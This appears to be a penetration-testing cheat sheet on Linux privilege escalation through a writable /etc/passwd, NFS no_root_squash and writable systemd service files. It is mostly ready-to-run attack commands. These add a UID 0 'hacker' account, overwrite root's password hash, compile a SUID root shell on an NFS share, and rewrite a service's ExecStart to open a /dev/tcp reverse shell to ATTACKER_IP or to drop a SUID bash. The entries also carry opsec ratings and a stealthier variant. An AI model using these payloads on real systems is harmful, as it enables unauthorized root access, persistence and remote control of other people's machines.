# Linux – Service & File Misconfigurations

### Writable /etc/passwd Root User Injection [added: 2026-04]
- **Tags:** #WritablePasswd #EtcPasswd #PrivEsc #Linux #UserInjection #PasswordHash #LinPEAS #FilePermission #MisconfiguredPerms
- **Trigger:** linpeas or manual check reveals /etc/passwd is writable by the current user (`ls -la /etc/passwd` shows write permission for user or group); or `find / -writable -name passwd 2>/dev/null` returns /etc/passwd
- **Prereq:** Low-privilege shell; write access to /etc/passwd (world-writable or writable by current user's group)
- **Yields:** Root shell by adding a new user with UID 0 and a known password, or by replacing root's password hash
- **Opsec:** High
- **Context:** On older or misconfigured Linux systems, /etc/passwd may be world-writable. While modern systems store password hashes in /etc/shadow, the passwd file still accepts password hashes in the second field — if a hash is present in /etc/passwd, it takes precedence over /etc/shadow. By appending a new line with UID 0 and a known password hash, you create a root-equivalent account.
- **Payload/Method:**
```bash
# Step 1: Verify /etc/passwd is writable
ls -la /etc/passwd
# Check for 'w' in the relevant permission field

# Step 2: Generate a password hash
# Using openssl (most commonly available):
openssl passwd -1 -salt xyz password123
# Output example: $1$xyz$abcdefghijklmnop

# Using Python if openssl is not available:
python3 -c "import crypt; print(crypt.crypt('password123', '\$6\$salt\$'))"

# Step 3: Append a root-equivalent user
echo 'hacker:$1$xyz$abcdefghijklmnop:0:0:root:/root:/bin/bash' >> /etc/passwd

# Step 4: Switch to the new root user
su hacker
# Enter: password123

# Alternative: Replace root's password hash directly (riskier — breaks root login with original password)
# Back up first:
cp /etc/passwd /tmp/passwd.bak
# Use sed to replace root's 'x' with a known hash:
sed -i 's|^root:x:|root:$1$xyz$abcdefghijklmnop:|' /etc/passwd
su root
# Enter: password123

# Verify:
id
whoami
```

### NFS no_root_squash Exploitation [added: 2026-04]
- **Tags:** #NFS #NoRootSquash #RootSquash #NFSExport #PrivEsc #Linux #MountShare #SUIDViaNFS #LinPEAS #Showmount #RemoteMount
- **Trigger:** `showmount -e <target>` reveals NFS exports; `/etc/exports` contains `no_root_squash` option; or nmap shows port 2049 (NFS) open and linpeas flags the misconfiguration
- **Prereq:** NFS share exported with `no_root_squash` option; ability to mount the NFS share from an attacker-controlled machine where you have root; network access to the NFS port (2049)
- **Yields:** Root shell on the target by creating a SUID root binary on the NFS share that the target user can execute
- **Opsec:** Med
- **Context:** NFS `no_root_squash` disables the default security measure that maps remote root (UID 0) to the anonymous user (nobody). With this option set, files created by root on the client retain UID 0 ownership on the server. This means you can mount the share on your attacker machine as root, create a SUID root binary, and then execute it from the target for instant root. This is a classic and highly reliable privilege escalation path.
- **Payload/Method:**
```bash
# --- On the TARGET (initial enumeration) ---

# Step 1: Check for NFS exports
cat /etc/exports
# Look for: /shared *(rw,no_root_squash)
showmount -e localhost
showmount -e TARGET_IP

# Verify no_root_squash is set (vs default root_squash)
grep "no_root_squash" /etc/exports

# --- On the ATTACKER MACHINE (as root) ---

# Step 2: Mount the NFS share
mkdir /tmp/nfs_mount
mount -t nfs TARGET_IP:/shared /tmp/nfs_mount -o nolock

# Step 3: Create a SUID root binary
cat > /tmp/nfs_mount/shell.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc /tmp/nfs_mount/shell.c -o /tmp/nfs_mount/shell
chmod +s /tmp/nfs_mount/shell
ls -la /tmp/nfs_mount/shell
# Should show: -rwsr-sr-x 1 root root ...

# Alternative: Copy bash itself as SUID
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +s /tmp/nfs_mount/rootbash

# --- Back on the TARGET ---

# Step 4: Execute the SUID binary
/shared/shell
# Or: /shared/rootbash -p

id
whoami
```

### Writable Systemd Service / Timer Exploitation [added: 2026-04]
- **Tags:** #Systemd #ServiceFile #SystemdTimer #ExecStart #PrivEsc #Linux #WritableService #Systemctl #LinPEAS #ServiceAbuse #UnitFile
- **Trigger:** linpeas or manual enumeration finds a .service or .timer file writable by the current user; or `find / -writable -name "*.service" 2>/dev/null` returns results in /etc/systemd/ or /lib/systemd/; or the current user can restart/reload services via sudo or polkit
- **Prereq:** Low-privilege shell; write access to a systemd .service file that runs as root (or a higher-privileged user); ability to restart the service (sudo systemctl restart, or wait for the system to restart it via a timer or reboot)
- **Yields:** Command execution as the service's configured user (typically root) by modifying the ExecStart directive
- **Opsec:** Med
- **Context:** Systemd unit files define how services run, including which user they execute as and what commands they invoke. If a .service file is writable, you can modify ExecStart to point to a malicious payload. The next time the service starts (manually, via timer, or on reboot), your payload runs as the configured user. Systemd timers (.timer files) are the modern replacement for cron — check those too.
- **Payload/Method:**
```bash
# Step 1: Find writable service and timer files
find /etc/systemd /lib/systemd /usr/lib/systemd -writable -name "*.service" -o -writable -name "*.timer" 2>/dev/null

# Also check for services running as root
systemctl list-units --type=service --state=running
# Cross-reference with writable files

# Step 2: Inspect the target service file
cat /etc/systemd/system/vulnerable.service
# Note the User= field (if absent, defaults to root)
# Note the ExecStart= field (what currently runs)

# Step 3: Modify ExecStart to inject payload

# Option A: Reverse shell
cat > /etc/systemd/system/vulnerable.service << 'EOF'
[Unit]
Description=Vulnerable Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'

[Install]
WantedBy=multi-user.target
EOF

# Option B: Create SUID bash (stealthier — no network callback)
cat > /etc/systemd/system/vulnerable.service << 'EOF'
[Unit]
Description=Vulnerable Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'

[Install]
WantedBy=multi-user.target
EOF

# Step 4: Reload systemd and restart the service
# If you have sudo systemctl access:
sudo systemctl daemon-reload
sudo systemctl restart vulnerable.service

# If you cannot restart — wait for automatic restart or reboot
# Check if a timer triggers it:
systemctl list-timers --all | grep vulnerable

# Step 5: Use the result
# If reverse shell: catch on attacker with nc -lvnp 9001
# If SUID bash:
/tmp/rootbash -p

id
whoami
```
